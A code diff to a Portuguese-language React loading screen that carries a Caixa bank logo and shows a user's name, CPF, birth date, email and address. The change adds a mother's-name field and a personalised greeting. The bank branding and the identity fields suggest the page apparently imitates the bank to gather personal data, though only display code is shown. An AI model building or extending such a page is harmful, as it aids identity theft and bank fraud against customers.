@@ -3,6 +3,7 @@ import { AiFillLock } from "react-icons/ai"; // Ícone de cadeado, usando react-
 import logo from "../assets/caixa.webp";
 import { Helmet } from "react-helmet"
 import { UserData } from "../types/userData";
+import dayjs from "dayjs";
 
 export function Loading() {
     const [progress, setProgress] = useState(0);
@@ -11,6 +12,7 @@ export function Loading() {
         nome: "",
         cpf: "",
         dataNascimento: "",
+        nomeMae: "",
         email: "",
         cep: "",
         cidade: "",
@@ -58,7 +60,7 @@ export function Loading() {
         <div className="w-screen h-screen flex flex-col items-center px-6 space-y-5 mt-6">
             <header className="flex flex-col items-center p-4 space-y-3">
                 <img width={170} src={logo} alt="logo" />
-                <span className="text-blue-800">Acesso Caixa</span>
+                <span className="text-blue-800">Seja bem vindo, {userData.nome.split(" ")[0]}</span>
             </header>
 
             <div className="w-full">
@@ -123,7 +125,10 @@ export function Loading() {
                             <strong>CPF:</strong> {userData?.cpf}
                         </p>
                         <p className="text-zinc-600">
-                            <strong>Data de Nascimento:</strong> {userData?.dataNascimento}
+                            <strong>Nome da mãe:</strong> {userData.nomeMae}
+                        </p>
+                        <p className="text-zinc-600">
+                            <strong>Data de Nascimento:</strong> {dayjs(userData?.dataNascimento).format("DD/MM/YYYY")}
                         </p>
                     </div>
                 )}
